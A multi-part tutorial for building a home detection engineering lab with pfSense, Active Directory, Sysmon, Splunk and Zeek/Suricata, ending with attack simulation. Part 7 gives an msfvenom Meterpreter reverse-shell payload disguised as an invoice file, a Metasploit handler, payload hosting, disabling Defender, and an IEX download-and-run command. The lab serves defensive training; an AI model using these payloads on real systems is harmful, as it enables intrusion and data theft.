# Detection Lab - Part 1

## **Environment Planning & PFsense Firewall Installation**

This section outlines the initial setup of the detection engineering lab, including the network diagram design, virtual machine planning, and the installation of the PFsense firewall. The objective of this phase is to establish a controlled, multi-VM environment for ingesting logs into a SIEM and simulating real-world attack scenarios.

## **Lab Overview**

This detection lab consists of **6 virtual machines**, each serving a distinct role in the simulated enterprise network:

| Component                              | Purpose                                         |
| -------------------------------------- | ----------------------------------------------- |
| **PFsense Firewall**                   | Network segmentation, routing, WAN/LAN handling |
| **Splunk Server**                      | SIEM for log ingestion & analysis               |
| **Active Directory Domain Controller** | Authentication, user management, event logs     |
| **Zeek + Suricata Server**             | Network IDS + packet analytics                  |
| **Windows 10 Workstation**             | User endpoint for simulation & telemetry        |
| **Kali Linux Attacker VM**             | Executes simulated attacks                      |

The environment is designed to mimic a small but realistic corporate network for detection engineering and defensive testing.

## **1. Designing the Network Diagram**

Using **draw.io**, the following components were outlined:

* **Internet**
* **PFsense Firewall**
* **Splunk Server**
* **Active Directory Domain Controller**
* **Zeek + Suricata IDS Server**
* **Windows 10 Workstation**
* **Kali Linux Attacker**
* **Layer-2 Switch** connecting internal hosts

Each host is logically placed behind the firewall, with the attacker VM functioning as an internal “red team” device for demonstration, even though a real attacker would sit outside the LAN.

## **2. Initial Network Configuration Plan**

**WAN Network (PFsense external interface)**
To be assigned dynamically depending on network adapter bridging.

**LAN Network (PFsense internal interface)**
Default planned range:

```
192.168.1.0/24  
PFsense LAN IP: 192.168.1.1
```

The PFsense WAN IP will be based on VMware bridging settings.

## **3. Installing PFsense on VMware Workstation Pro**

### **Step 1 - Download PFsense**

* Navigate to **[https://pfsense.org]**
* Select **Download → ISO Image → 2.7.2** (Community Edition)
* Create an account to receive the download link

## **4. Creating the PFsense VM**

### VM Specs:

```
CPU: 1 core
RAM: 2 GB recommended (install fails with 256 MB)
Disk: 30 GB
OS Type: Other / FreeBSD 64-bit
```

### Enable Two Network Adapters:

| Adapter               | Mode                    | Purpose |
| --------------------- | ----------------------- | ------- |
| **Network Adapter 1** | Bridged or Custom VMnet | WAN     |
| **Network Adapter 2** | NAT                     | LAN     |

> **Important:**
> If your host uses **Wi-Fi**, configure **VMNet0** to bridge to your wireless adapter manually via *Virtual Network Editor*.

## **5. Fixing Common Network Adapter Issues**

If WAN cannot reach the internet during installation:

1. Open **Virtual Network Editor**
2. Set **VMNet0 → Bridged → Wi-Fi Adapter**
3. Remove unused VMNet networks
4. Reconfigure PFsense NICs accordingly

## **6. Running the PFsense Installer**

1. Boot from the ISO
2. Choose:

   * *Accept*
   * *Install*
   * *Auto (ZFS)*
   * *Stripe*
3. Select latest **Community Edition**
4. Assign interfaces:

Identify adapters by MAC address:

```
em0 → WAN interface (matches bridged NIC MAC)
em1 → LAN interface (matches NAT NIC MAC)
```

5. PFsense completes installation
6. Reboot

## **7. Confirm Post-Install Interface Assignments**

Example output:

```
WAN  → 10.0.0.243   (dynamic address)
LAN  → 192.168.1.1  (default gateway)
```

Update your diagram with:

* **WAN:** 10.0.0.243/24
* **LAN:** 192.168.1.0/24

## **8. Lab Network Diagram (Conceptual)**

<div>
    <img src="https://i.imgur.com/DQxmrAW.jpg" />
</div>

*Ref 1: Network Diagram*

# Detection Lab - Part 2

## **Active Directory Domain Controller (ADDC) Deployment**

In this phase of the Detection Engineering Lab, we deploy a **Windows Server 2022 Domain Controller**, configure Active Directory, create organizational units, add users, and join a Windows 10 workstation to the domain. This forms the backbone for enterprise identity telemetry used throughout the detection lab.

## **Objectives**

* Install **Windows Server 2022 Standard**
* Promote the server to a **Domain Controller (ADDS)**
* Create base **Organizational Units (OUs)** and users
* Configure a **static IP** for the server
* Join a Windows 10 workstation to the domain
* Prepare environment for Group Policy & event logging

## **1. Download & Prepare Windows Server 2022**

1. Search: **“Windows Server ISO”**
2. Download **Windows Server 2022 Standard (Evaluation)**
   * Requires registration
3. Save ISO for use in VMware Workstation

## **2. Create the Server VM in VMware Workstation**

### VM Configuration

| Setting    | Value                         |
| ---------- | ----------------------------- |
| Name       | `ADDC01`                      |
| OS         | Windows Server 2022 Standard  |
| Disk       | 60 GB                         |
| Memory     | **4 GB** (2 GB caused issues) |
| Processors | 1                             |
| Network    | NAT (LAN network)             |

> ❗ If auto-install fails (“Cannot find license terms”), disable VMware’s Autoinstall/Floppy settings and proceed with manual installation.

## **3. Install Windows Server 2022**

1. Boot the VM
2. Choose:
   * **Standard Evaluation (Desktop Experience)**
3. Accept license → Custom Install → Next
4. After installation, set Administrator password
5. Log in and dismiss *Server Manager* (will appear automatically)

## **4. Rename the Server**

1. Open **Settings → System → About**
2. Click **Rename this PC**
3. Set to:

```
ADDC01
```

4. Restart the VM

## **5. Assign a Static IP Address**

Network → Adapter Settings → IPv4 Properties:

| Field         | Value                          |
| ------------- | ------------------------------ |
| IP            | `192.168.1.10`                 |
| Subnet        | `255.255.255.0`                |
| Gateway       | `192.168.1.1` (PFsense LAN IP) |
| Preferred DNS | `192.168.1.1`                  |
| Alternate DNS | `8.8.8.8`                      |

Validate:

```cmd
ping 192.168.1.1
```

## **6. Install Active Directory Domain Services**

1. Open **Server Manager**
2. Select **Manage → Add Roles and Features**
3. Choose:
   * **Role-based installation**
   * Server: `ADDC01`
4. Install:
   ```
   Active Directory Domain Services (ADDS)
   ```
5. After installation → click the yellow flag →
   **“Promote this server to a domain controller”**

## **7. Create New Forest / Domain**

Choose:

```
Add a new forest
Domain: MYDFIR.local
Forest Functional Level: Windows Server 2016
Domain Functional Level: Windows Server 2016
```

Set Directory Services Restore Mode (DSRM) password → Next → Install.

The server will restart.

## **8. Verify Domain Controller Installation**

Log in again:

```
MYDFIR\Administrator
```

Verify:

* **System Properties → Domain: MYDFIR.local**

## **9. Create OUs and Users**

Open:

```
Active Directory Users and Computers
```

Create Organizational Units:

```
Finance
IT
Sales
```

Create users:

### Finance → Sally Smith

```
Username: sally
Password: (set & uncheck “User must change password at next logon”)
```

### IT → Steven MyDFIR

```
Username: steven
Password: (set)
```

### Sales → Bob Smith

```
Username: bob
Password: (set)
```

## **10. Join Windows 10 Workstation to the Domain**

> Note: Windows 10 **Pro** edition is required.

### Fix networking first

Windows workstation default IP was not on the LAN subnet.

Set static IP:

| Field         | Value                              |
| ------------- | ---------------------------------- |
| IP            | `192.168.1.100`                    |
| Gateway       | `192.168.1.1`                      |
| Preferred DNS | `192.168.1.10` (Domain Controller) |
| Alternate DNS | `192.168.1.1`                      |

Validate:

```cmd
ping 192.168.1.1
ping 192.168.1.10
```

### Join the domain

1. Right-click **This PC → Properties**
2. **Rename this PC (Advanced)**
3. Domain:

   ```
   MYDFIR.local
   ```
4. Enter credentials:

```
User: MYDFIR\Administrator
```

5. Restart Windows 10

## **11. Test Domain Login**

On Windows 10 → login screen:

Select **Other user**

Log in as:

```
Username: mydfir\steven
Password: <password>
```

If login succeeds → Active Directory is functioning properly.


# Part 3 – Configuring Microsoft Recommended Audit Policies & Sysmon

This section walks through configuring Microsoft’s baseline audit recommendations using **Group Policy Objects (GPOs)**, enabling **process command-line logging**, and installing **Sysmon** for enhanced endpoint telemetry.

## 1. Overview of Microsoft Audit Baselines

Microsoft provides recommended audit settings because Windows defaults are insufficient for detection and investigation.  
Key categories include:

- **Account Logon / Account Management**
- **Detailed Tracking**
- **Logon/Logoff**
- **Policy Change**
- **System Events**

Reference: Microsoft Baseline Security Audit Recommendations (https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations).

## 2. Create and Link a New GPO

1. On the domain controller (`ADDC01`), open **Group Policy Management**.
2. Expand:
```
Forest → Domains → <your-domain>
```
3. Right-click the domain → **Create a GPO in this domain, and Link it here**.
4. Name it:
```
Audit Policy – Endpoint
```
5. Right-click the GPO → **Edit**.

## 3. Configure Advanced Audit Policies

Navigate to:

```
Computer Configuration
→ Policies
→ Windows Settings
→ Security Settings
→ Advanced Audit Policy Configuration
→ Audit Policies
```

### Enable the following according to Microsoft baselines:

### **Account Logon**
- Audit Credential Validation → Success

### **Account Management**
- Audit Computer Account Management → Success  
- Audit Other Account Management → Success  
- Audit Security Group Management → Success  
- Audit User Account Management → Success

### **Detailed Tracking**
- Audit Process Creation → Success

### **Logon/Logoff**
- Audit Logoff → Success  
- Audit Logon → Success & Failure  
- Audit Special Logon → Success

### **Policy Change**
- Audit Policy Change → Success & Failure  
- Audit Authentication Policy Change → Success

### **System**
- IPsec Driver → Success & Failure  
- Security State Change → Success & Failure  
- Security System Extension → Success & Failure  
- System Integrity → Success & Failure

## 4. Enable Command-Line Logging for Event ID 4688

Process creation logs become far more valuable when they include command-line arguments.

1. Navigate to:
```
Computer Configuration → Policies → Administrative Templates → System → Audit Process Creation
```
2. Enable:
```
"Include command line in process creation events"
```

### 5. Enable PowerShell Script Block Logging (Event ID 4104)

1. Navigate to:
```
Administrative Templates → Windows Components → Windows PowerShell
```
2. Enable:
- **Turn on PowerShell Script Block Logging**
- Log start and stop events

## 6. Enable Subcategory Enforcement (Critical!)

Required for advanced audit policies to function:

1. Navigate to:
```
Security Settings → Local Policies → Security Options
```
2. Enable:
```
Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy
```

## 7. Apply Policies to Endpoints

On the Windows 10 workstation:

```powershell
gpupdate /force
```

Verify Event ID **4688** now includes command-line data.

## 8. Install and Configure Sysmon

Sysmon provides detailed endpoint telemetry not available in standard Windows logs.

### Steps:

1. Download **Sysmon** from Microsoft Sysinternals.
2. Download Sysmon config (Olaf’s recommended `sysmonconfig.xml`).
3. Extract Sysmon folder and place config inside it.
4. Open PowerShell as Administrator:

   ```powershell
   cd C:\Users\<user>\Downloads\Sysmon
   .\Sysmon64.exe -i sysmonconfig.xml
   ```
5. Confirm installation:

   * Check **services.msc** → Sysmon64 is running.
   * Open Event Viewer →

     ```
     Applications and Services Logs → Microsoft → Windows → Sysmon
     ```

# Part 4 - Splunk Server Configuration & Windows/Domain Controller Log Forwarding

This section covers configuring the Splunk server with a static IP, creating a detection index, installing the Splunk Universal Forwarder on the Windows workstation and Domain Controller, applying the correct `inputs.conf` configuration, and validating end-to-end log ingestion.

## **1. Assign a Static IP to the Splunk Server**

On the Splunk machine, check the current IP:
```bash
ip a
````

If the system is not on the detection lab network, configure a static IP:

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

Update configuration:

```yaml
dhcp4: false
addresses:
  - 192.168.1.20/24
routes:
  - to: default
    via: 192.168.1.1
nameservers:
  addresses: [8.8.8.8]
```

Apply settings:

```bash
sudo netplan apply
```

Verify:

```bash
ip a
ping 192.168.1.1     # PFsense
ping 192.168.1.10    # Domain Controller
```

Update network diagram:

```
Splunk → 192.168.1.20
```

## **2. Create the Splunk Index**

On the Splunk Web UI (from Windows 10 browser):

1. Go to **Settings → Indexes**
2. Click **New Index**
3. Name it:

   ```
   mydfir-detect
   ```

## **3. Install the Splunk Universal Forwarder on Windows 10**

1. Download the Windows Universal Forwarder from Splunk’s website.
2. Run the installer:

   * Accept license
   * Set username: `admin`
   * Deployment server: **none**
   * Receiving indexer:

     ```
     192.168.1.20
     Port: 9997
     ```
3. Finish installation.

## **4. Enable Receiving on Splunk (Port 9997)**

On Splunk Web:

1. **Settings → Forwarding and Receiving**
2. Click **Configure Receiving**
3. Add port:

   ```
   9997
   ```

## **5. Configure `inputs.conf` on the Windows Forwarder**

Download the `inputs.conf` from GitHub:

```
https://github.com/MyDFIR/Active-Directory-Project
```

Place the file into:

```
C:\Program Files\SplunkUniversalForwarder\etc\system\local\
```

Open the file and update indexes:

```conf
[WinEventLog://Security]
index = mydfir-detect
disabled = false

[WinEventLog://System]
index = mydfir-detect
disabled = false

[WinEventLog://Application]
index = mydfir-detect
disabled = false

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = mydfir-detect
disabled = false
```

**Important:** Save as *all files*, not `.txt`.

## **6. Fix Permissions & Restart the Forwarder Service**

Open **Services** → find:

```
SplunkForwarder
```

Set Log On As:

```
Local System account
```

Restart the service.

## **7. Verify Log Ingestion**

In Splunk Search:

```kql
index=mydfir-detect
```

You should see events from:

* `WinEventLog:Security`
* `WinEventLog:System`
* `WinEventLog:Application`
* `Sysmon`

Hostnames should include your Windows workstation.

## **8. Install the Splunk Universal Forwarder on the Domain Controller**

From the Domain Controller:

1. Access the shared tools folder from Windows 10:

   ```
   \\<Windows10Host>\tools
   ```
2. Copy over:

   * Splunk Universal Forwarder installer
   * Sysmon
   * `inputs.conf`
3. Install Sysmon:

   ```powershell
   .\Sysmon64.exe -i sysmonconfig.xml
   ```
4. Install the Splunk Universal Forwarder:

   * Username: `admin`
   * Indexer: `192.168.1.20:9997`
5. Copy the same `inputs.conf` to:

   ```
   C:\Program Files\SplunkUniversalForwarder\etc\system\local\
   ```
6. In **Services**, ensure **SplunkForwarder** runs under:

   ```
   Local System account
   ```

   Restart the service.

## **9. Validate Active Directory Log Forwarding**

In Splunk Search:

```kql
index=mydfir-detect | stats count by host
```

Expected hosts:

* `Windows10`
* `ADDC01`

Active Directory logs should appear automatically.

<div>
    <img src="https://i.imgur.com/7GHFKUC.png" />
</div>

*Ref 2: Ingested Logs*

## **10. Status Recap**

At this stage:

| Component         | Status                        |
| ----------------- | ----------------------------- |
| PFsense           | ✔ Installed                   |
| Domain Controller | ✔ Configured & logging        |
| Windows 10        | ✔ Joined domain & logging     |
| Sysmon            | ✔ Installed on both endpoints |
| Splunk Server     | ✔ Static IP & index           |
| Windows Forwarder | ✔ Installed & sending logs    |
| AD Forwarder      | ✔ Installed & sending logs    |

The next steps involve configuring **Zeek and Suricata** to complete the network visibility pipeline.

# Part 5 - Installing Splunk Universal Forwarder on Zeek/Suricata Sensor & Sending Logs to Splunk

This section covers configuring the **Zeek + Suricata sensor** (192.168.1.30) to forward its network visibility logs into the Splunk SIEM. Steps include assigning a static IP, installing the Splunk Universal Forwarder, configuring forwarding, enabling JSON logging in Zeek, configuring Suricata’s logging, and finalizing the Splunk inputs configuration.

## 1. Set Static IP for Zeek/Suricata Sensor

Edit Netplan configuration:

```bash
sudo nano /etc/netplan/00-installer-config.yaml
````

Configure:

```yaml
addresses:
  - 192.168.1.30/24
routes:
  - to: default
    via: 192.168.1.1
nameservers:
  addresses: [8.8.8.8]
```

Apply settings:

```bash
sudo netplan apply
ip a
```

Verify you can reach Splunk:

```bash
ping 192.168.1.20
```

## 2. Download & Install Splunk Universal Forwarder (Debian)

Since copy/paste is disabled, convert the long Splunk download link into a short one using TinyURL:

1. Visit **tinyurl.com**
2. Paste the Splunk `.deb` download link
3. Create a shortened URL, e.g.:

```
https://tinyurl.com/mydfir-detect
```

Download on the sensor:

```bash
wget https://tinyurl.com/mydfir-detect
mv mydfir-detect splunk
sudo dpkg -i splunk
```

## 3. Start Splunk Forwarder & Configure Credentials

Navigate to the Splunk Forwarder directory:

```bash
cd /opt/splunkforwarder/bin
sudo -u splunkfwd bash
./splunk start
```

Accept the license and set:

* **Username:** `admin`
* **Password:** your choice

Enable Splunk Forwarder at boot:

```bash
sudo ./splunk enable boot-start
```

## 4. Configure Forwarding to Splunk Indexer

Add the Splunk server:

```bash
sudo ./splunk add forward-server 192.168.1.20:9997
```

Verify:

```bash
sudo ./splunk list forward-server
```

You should see:

```
Active forwards:
    192.168.1.20:9997
```

## 5. Configure Inputs to Send Zeek & Suricata Logs to Splunk

Create the inputs config file:

```bash
sudo nano /opt/splunkforwarder/etc/system/local/inputs.conf
```

Add Zeek log forwarding:

```ini
[default]
host = 192.168.1.30

[monitor:///opt/zeek/logs/current]
_TCP_ROUTING = *
disabled = false
index = mydfir-detect
sourcetype = bro:json
whitelist = \.log$
```

Add Suricata log forwarding:

```ini
[monitor:///var/log/suricata/eve.json]
_TCP_ROUTING = *
disabled = false
index = mydfir-detect
sourcetype = suricata
```

Restart the Splunk Forwarder:

```bash
sudo /opt/splunkforwarder/bin/splunk restart
```

## 6. Enable JSON Logging in Zeek

Edit Zeek’s local configuration:

```bash
sudo nano /opt/zeek/share/zeek/site/local.zeek
```

Add:

```zeek
@load policy/tuning/json-logs
redef ignore_checksums = T;
```

Redeploy Zeek:

```bash
sudo /opt/zeek/bin/zeekctl deploy
```

Verify logs:

```bash
ls /opt/zeek/logs/current
```

## 7. Configure Suricata to Log Correct Interface

Edit Suricata’s config:

```bash
sudo nano /etc/suricata/suricata.yaml
```

Update interface from `eth0` / `e0` → `ens33`:

```yaml
interface: ens33
```

Restart Suricata:

```bash
sudo systemctl restart suricata
sudo systemctl status suricata
```

Confirm logs:

```bash
ls -lh /var/log/suricata/eve.json
```

## 8. Enable Promiscuous Mode for Packet Capture

Zeek & Suricata require promiscuous mode to see *all* network traffic:

```bash
sudo ip link set ensXX promisc on
```

Verify:

```bash
ip a
```

Should show:

```
BROADCAST MULTICAST PROMISC UP
```

## 9. Validate Log Ingestion in Splunk

Search in Splunk:

```spl
index=mydfir-detect sourcetype="bro:json"
```

```spl
index=mydfir-detect sourcetype="suricata"
```

You should now see:

* `conn.log`
* `dns.log`
* `http.log`
* Suricata EVE JSON events

Your Zeek/Suricata sensor is now fully integrated into Splunk SIEM.

## Updated Network Map (After Part 5)

| Component              | IP            | Status                                   |
| ---------------------- | ------------- | ---------------------------------------- |
| Zeek + Suricata Sensor | 192.168.1.30  | ✔ Forwarding JSON logs to Splunk         |
| Splunk SIEM            | 192.168.1.20  | ✔ Receiving logs                         |
| Active Directory       | 192.168.1.10  | ✔ Forwarding                             |
| Windows 10             | 192.168.1.100 | ✔ Forwarding                             |
| PFsense Firewall       | 192.168.1.1   | ❗ Not yet configured (covered in Part 6) |

Your detection lab now has **full network telemetry** and is ready for enrichment, correlation, and detection engineering.

# Part 6 - Forwarding PFsense Firewall Logs to Splunk (FreeBSD Forwarder)

This section documents how to configure **PFsense** (FreeBSD-based firewall) to forward its firewall logs into **Splunk** using the **Splunk Universal Forwarder for FreeBSD**. Because Splunk currently supports **FreeBSD 12.x**, PFsense must be installed with a compatible version (PFsense 2.6).

## 1. Initial PFsense Setup

Access PFsense from a browser:

```
[http://192.168.1.1]
````

Default credentials:

- **Username:** `admin`
- **Password:** `pfsense`

Perform the initial setup wizard:

1. Accept defaults for hostname/domain.
2. **Uncheck “Block private networks (RFC1918)”** on the WAN interface  
   (PFsense’s WAN is inside the lab’s private network).
3. Confirm LAN IP: `192.168.1.1`.
4. Set a new admin password.
5. Reload PFsense to complete setup.

## 2. Checking FreeBSD Version Compatibility

Splunk Universal Forwarder supports **FreeBSD 12.x**.  
PFsense 2.7 uses **FreeBSD 14**, which will cause the forwarder to crash.

Verify version:

```bash
freebsd-version
````

If it shows **14.x**, reinstall PFsense with version **2.6**, which uses FreeBSD **12.3**.

> ✔ PFsense 2.6 + Splunk Universal Forwarder works correctly
> ❌ PFsense 2.7 (FreeBSD 14.x) is incompatible with Splunk UF

## 3. (Optional) Install Squid Proxy

> **Note:** Squid installation fails on PFsense 2.7 due to PHP version mismatch.
> Until Splunk supports FreeBSD 14 or PFsense fixes package compatibility, Squid is left out.

Navigate to:

```
System → Package Manager → Available Packages
```

Search “squid”.

If installation is blocked, skip proxy ingestion for now.

## 4. Download Splunk Universal Forwarder (FreeBSD)

Since PFsense uses FreeBSD, download the **FreeBSD** Splunk UF package from Splunk’s website.

Because copy/paste isn’t available in the PFsense terminal, shorten the URL using TinyURL:

1. Copy Splunk FreeBSD download URL
2. Go to **[https://tinyurl.com]**
3. Create a short link, e.g.:

```
https://tinyurl.com/mydfir-detect1
```

On PFsense shell (option **8**):

```bash
fetch https://tinyurl.com/mydfir-detect1
```

Extract:

```bash
tar xvzf <filename>.tgz
```

A new directory named `splunkforwarder` will appear.

## 5. Start the Splunk Forwarder

Navigate into Splunk UF binary folder:

```bash
cd splunkforwarder/bin
./splunk start
```

Follow prompts:

* Press **Q** to quit license
* Type **Y** to accept
* Set username/password (admin / your password)

## 6. Configure Forwarding to Splunk Indexer

Add Splunk heavy forwarder or indexer:

```bash
./splunk add forward-server 192.168.1.20:9997
```

Restart to activate forwarding:

```bash
./splunk stop
./splunk start
```

Verify:

```bash
./splunk list forward-server
```

You should see:

```
Active forwards:
  192.168.1.20:9997
```

## 7. Create `inputs.conf` (FreeBSD uses `vi`)

Navigate to:

```bash
cd /splunkforwarder/etc/system/local
vi inputs.conf
```

Press **I** to enter insert mode and add:

```ini
[default]
host = 192.168.1.1

[monitor:///var/log/filter.log]
_TCP_ROUTING = *
disabled = false
index = mydfir-detect
sourcetype = pfsense
```

Save and exit:

```
ESC :wq!
```

Restart Splunk UF:

```bash
cd /splunkforwarder/bin
./splunk restart
```

## 8. Validate Firewall Log Ingestion in Splunk

On Splunk search:

```spl
index=mydfir-detect sourcetype=pfsense
```

Logs should now appear.

<div>
    <img src="https://i.imgur.com/2ULyk4U.png" />
</div>

*Ref 3: Ingested Logs by sourcetype*

> Note: PFsense logs may be unparsed until you install the **TA-pfsense Splunk Add-on**, which provides CIM mappings and field extraction.

### Final Lab Topology After Part 6

| Component              | IP            | Log Status                      |
| ---------------------- | ------------- | ------------------------------- |
| PFsense Firewall       | 192.168.1.1   | ✔ Forwarding `filter.log`       |
| Zeek + Suricata Sensor | 192.168.1.30  | ✔ JSON logs                     |
| Splunk Server          | 192.168.1.20  | ✔ Receiving all logs            |
| Active Directory DC    | 192.168.1.10  | ✔ WinEvent + Sysmon             |
| Windows 10 Endpoint    | 192.168.1.100 | ✔ Sysmon + PowerShell           |
| Kali Linux Attacker    | 192.168.1.200 | Pending (C2 demonstration next) |

### Completed Ingestion Pipeline (After Part 6)

* Firewall telemetry (PFsense)
* Proxy-ready (Squid pending support)
* Network telemetry (Zeek + Suricata)
* Endpoint + Sysmon logs
* AD + DNS logs

Your Splunk SIEM is now receiving **full perimeter, endpoint, and network telemetry**, preparing the environment for:

* Malware execution & detection
* C2 traffic analysis
* Atomic Red Team tests
* Detection engineering & correlation

# Part 7 - Kali Linux Attack Simulation & Atomic Red Team Telemetry

This section demonstrates generating attacker telemetry for the detection lab using **Kali Linux**, **Metasploit**, **custom malware**, **Nmap scanning**, and **Atomic Red Team**. All activity is safely contained inside the virtual lab to build detection, enrichment, and hunting skills inside Splunk.

## 1. Deploying Kali Linux

Download Kali VM:

- https://kali.org → Download → Virtual Machines  
  (Choose VMware or VirtualBox)

Open the `.vmx` file and remove any extra network adapters to avoid conflicts.

Log in with default credentials:

```
username: kali
password: kali
```

Check current IP:

```bash
ip a
```

If Kali receives a `192.168.136.x` NAT address, switch to a static address on the lab network.

## 2. Assigning a Static IP to Kali Linux

Navigate to:

```
Settings → Advanced Network Configuration → Wired → IPv4
```

Configure:

* **Address:** `192.168.1.250`
* **Netmask:** `255.255.255.0`
* **Gateway:** `192.168.1.1` (PFsense)
* **DNS:** `192.168.1.1`

Refresh the interface by simply toggling your connection from off to on.

Verify:

```bash
ip a
ping 192.168.1.20   # Splunk Server
```

## 3. Generating a Reverse Shell Malware (Msfvenom)

Create a simple Windows payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.250 LPORT=4444 \
-f exe -o invoices.docx.exe
```

Verify file type:

```bash
file invoices.docx.exe
```

## 4. Setting Up the Metasploit Handler

Start Metasploit:

```bash
msfconsole
```

Configure the handler:

```bash
use exploit/multi/handler
set LHOST 192.168.1.250
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

This opens the listener waiting for Windows to execute the payload.

## 5. Hosting Malware via HTTP Server

Start a simple Python web server:

```bash
python3 -m http.server 9999
```

From **Windows 10**, browse to:

```
http://192.168.1.250:9999
```

Download `invoices.docx.exe`.

> Disable Windows Defender temporarily (lab-only) to allow execution.

After execution, Metasploit receives a Meterpreter session:

```bash
meterpreter > help
meterpreter > ps
meterpreter > ls
```

You may download files back to Kali, e.g.:

```bash
download Sysmon.zip
```

Telemetry is now flowing into Splunk.

## 6. Generating Network Noise with Nmap

Run a noisy scan across the entire lab network:

```bash
nmap -A 192.168.1.0/24
```

This produces large volumes of IDS and firewall alerts (Zeek, Suricata, PFsense).

Review in Splunk:

```spl
index=mydfir-detect src=192.168.1.250
```

## 7. Installing Atomic Red Team (ATT&CK Techniques)

Navigate to:

```
https://github.com/redcanaryco/atomic-red-team/wiki
```

Install framework (Windows 10, PowerShell as Admin):

```powershell
Set-ExecutionPolicy Bypass -Scope LocalMachine
```

Download and install Invoke-AtomicRedTeam:

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics
```

Test an ATT&CK technique:

```powershell
Invoke-AtomicTest T1136.001 -Verbose
```

This generates a **local user account creation** event, allowing validation of:

* Event ID 4688 (process creation)
* Event ID 4720 (account creation)
* Sysmon Event ID 1

Search in Splunk:

```spl
index=mydfir-detect "NewLocalUser"
```

## 8. Splunk Hunting Examples

**Identify ports scanned by Kali:**

```spl
index=mydfir-detect src=192.168.1.250
| stats count by id.resp_p
```

**Count destination hosts scanned:**

```spl
index=mydfir-detect src=192.168.1.250
| stats dc(id.resp_p) count by id.resp_h
```

This highlights the breadth of Nmap scanning across the network.

## 9. Final Detection Lab Topology

| Component              | IP Address    | Status                 |
| ---------------------- | ------------- | ---------------------- |
| PFsense Firewall       | 192.168.1.1   | ✔ Logs forwarded       |
| Splunk Enterprise      | 192.168.1.20  | ✔ SIEM ingest          |
| Active Directory DC    | 192.168.1.10  | ✔ WinEvent & Sysmon    |
| Windows 10 Endpoint    | 192.168.1.100 | ✔ Sysmon, GPO logging  |
| Zeek + Suricata Sensor | 192.168.1.30  | ✔ JSON logs            |
| Kali Linux             | 192.168.1.250 | ✔ Adversary Simulation |

<div>
    <img src="https://i.imgur.com/z94ap9a.png" />
</div>

*Ref 4: Network Hosts*

## 10. Final Notes

This completes the full detection engineering pipeline:

* Built SIEM ingestion across firewall, endpoint, domain controller, and IDS
* Deployed Zeek & Suricata
* Forwarded all telemetry to Splunk
* Simulated attacker behavior with Kali Linux
* Ran Atomic Red Team techniques for structured ATT&CK mapping
* Performed threat hunting inside Splunk

Your environment now mirrors a small/medium enterprise detection stack—ideal for SOC analysis, threat hunting, detection engineering, and IR training.
